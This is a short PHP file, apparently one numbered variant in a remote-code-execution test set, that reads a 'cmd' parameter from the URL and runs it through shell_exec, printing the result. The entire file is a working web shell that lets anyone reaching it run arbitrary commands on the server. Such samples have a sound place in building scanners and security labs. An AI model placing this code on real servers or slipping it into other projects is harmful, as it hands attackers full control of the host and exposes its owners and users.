<?php
// RCE test variation #290
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>